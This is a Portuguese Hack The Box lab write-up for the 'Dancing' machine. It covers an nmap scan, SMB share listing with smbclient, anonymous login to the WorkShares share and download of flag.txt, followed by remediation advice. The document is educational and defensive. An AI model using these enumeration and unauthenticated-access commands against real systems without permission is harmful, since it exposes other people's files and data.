# HTB — Dancing

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green)
![Difficulty](https://img.shields.io/badge/Difficulty-Very%20Easy-brightgreen)
![OS](https://img.shields.io/badge/OS-Windows-blue)
![Category](https://img.shields.io/badge/Category-SMB%20Enumeration-orange)

## 1. Informações do Laboratório

| Informação | Detalhes |
|---|---|
| Plataforma | Hack The Box |
| Máquina | Dancing |
| Dificuldade | Very Easy |
| Sistema Operacional | Windows |
| Categoria | SMB / Network Enumeration |
| Objetivo | Identificar compartilhamentos SMB e localizar a flag |

## 2. Objetivo

Realizar o reconhecimento da máquina Dancing, identificar serviços disponíveis, enumerar compartilhamentos SMB e verificar a possibilidade de acesso anônimo aos arquivos disponibilizados pelo servidor.

## 3. Ambiente e Ferramentas

- Kali Linux
- VirtualBox
- OpenVPN
- Nmap
- SMBClient

## 4. Reconhecimento

### 4.1. Conexão VPN

Primeiramente, foi estabelecida uma conexão VPN com a infraestrutura do Hack The Box utilizando OpenVPN.

```bash
sudo openvpn ~/Downloads/SEU_ARQUIVO.ovpn
```

Para verificar as interfaces de rede:

```bash
ip a
```

A interface `tun0` foi utilizada para verificar a conexão VPN.

### 4.2. Varredura de portas com Nmap

Foi realizada uma varredura para identificar portas abertas e serviços disponíveis na máquina-alvo.

```bash
nmap -sC -sV IP_DO_ALVO
```

**Resultado:**

```text
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

**Análise:**

| Porta | Serviço | Descrição |
|---|---|---|
| 135 | MSRPC | Comunicação remota do Windows |
| 139 | NetBIOS | Comunicação em rede |
| 445 | SMB | Compartilhamento de arquivos |
| 5985 | HTTP/WinRM | Gerenciamento remoto do Windows |

A porta TCP 445 foi selecionada como principal alvo de investigação por utilizar o protocolo SMB (*Server Message Block*).

## 5. Enumeração SMB

### 5.1. Listagem dos compartilhamentos

Foi utilizada a ferramenta `smbclient` para identificar os compartilhamentos disponíveis no servidor.

```bash
smbclient -L IP_DO_ALVO -N
```

**Parâmetros:**

- `-L`: lista os compartilhamentos disponíveis.
- `-N`: não solicita senha.

**Resultado:**

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
WorkShares      Disk
```

Foram identificados quatro compartilhamentos:

- ADMIN$
- C$
- IPC$
- WorkShares

O compartilhamento `WorkShares` foi selecionado para investigação.

### 5.2. Acesso anônimo ao compartilhamento

Foi realizada uma tentativa de conexão sem fornecer credenciais.

```bash
smbclient //IP_DO_ALVO/WorkShares -N
```

**Resultado:**

```text
smb: \>
```

A conexão foi estabelecida com sucesso, demonstrando que o compartilhamento permitia acesso sem autenticação.

## 6. Enumeração dos Diretórios

Após acessar o compartilhamento, foi executado:

```bash
ls
```

**Resultado:**

```text
.
..
Amy.J
James.P
```

Foram encontrados dois diretórios:

- Amy.J
- James.P

### 6.1. Acessando o diretório James.P

```bash
cd James.P
```

Em seguida:

```bash
ls
```

**Resultado:**

```text
.
..
flag.txt
```

Foi identificado o arquivo `flag.txt` dentro do diretório `James.P`.

## 7. Download do Arquivo

Para transferir o arquivo do servidor SMB para a máquina Kali, foi utilizado:

```bash
get flag.txt
```

Após o download, a sessão SMB pode ser encerrada:

```bash
exit
```

Para visualizar o conteúdo do arquivo local:

```bash
cat flag.txt
```

**Observação:** O arquivo foi localizado durante o laboratório. A confirmação da leitura local da flag deve ser registrada após a execução dos comandos acima.

## 8. Vulnerabilidade Identificada

### Acesso anônimo ao compartilhamento SMB

Foi identificado que o compartilhamento `WorkShares` permitia conexões sem autenticação.

Essa configuração pode representar um risco de segurança, pois possibilita que usuários sem credenciais acessem arquivos disponibilizados no compartilhamento.

**Possíveis impactos:**

- Exposição de arquivos internos.
- Acesso não autorizado a documentos.
- Vazamento de informações.
- Comprometimento da confidencialidade dos dados.

### Recomendações

- Desabilitar o acesso anônimo aos compartilhamentos.
- Exigir autenticação para acessar arquivos.
- Aplicar permissões adequadas aos usuários.
- Restringir o acesso SMB por firewall.
- Monitorar acessos e tentativas de autenticação.
- Revisar periodicamente os compartilhamentos disponíveis.

## 9. Principais Comandos Utilizados

| Comando | Finalidade |
|---|---|
| `ip a` | Verificar interfaces de rede |
| `ip route` | Visualizar rotas de rede |
| `nmap -sC -sV IP` | Identificar portas e serviços |
| `smbclient -L IP -N` | Listar compartilhamentos SMB |
| `smbclient //IP/WorkShares -N` | Acessar compartilhamento |
| `ls` | Listar arquivos e diretórios |
| `cd James.P` | Acessar diretório |
| `get flag.txt` | Baixar arquivo remoto |
| `exit` | Encerrar sessão SMB |
| `cat flag.txt` | Ler arquivo local |

## 10. Aprendizados

Durante este laboratório, foram praticados:

- Reconhecimento de rede com Nmap.
- Identificação de serviços Windows.
- Funcionamento do protocolo SMB.
- Enumeração de compartilhamentos.
- Identificação de acesso anônimo.
- Navegação em diretórios remotos.
- Transferência de arquivos com SMBClient.
- Análise de configurações inadequadas de permissões.

## 11. Conclusão

O laboratório Dancing demonstrou a importância do reconhecimento e da enumeração de serviços durante uma avaliação de segurança.

A identificação da porta 445 permitiu direcionar a investigação para o protocolo SMB. A enumeração revelou o compartilhamento `WorkShares`, que aceitava conexões sem autenticação.

Durante a exploração, foram encontrados diretórios e identificado o arquivo `flag.txt` dentro de `James.P`.

O principal aprendizado foi compreender como configurações inadequadas de autenticação e permissões podem expor arquivos e informações em ambientes Windows.

---

**Laboratório concluído:** Dancing  
**Plataforma:** Hack The Box  
**Estudo:** Network Enumeration / SMB  
**Autora:** Tuany Fonseca

> Material desenvolvido para fins educacionais em ambiente controlado e autorizado.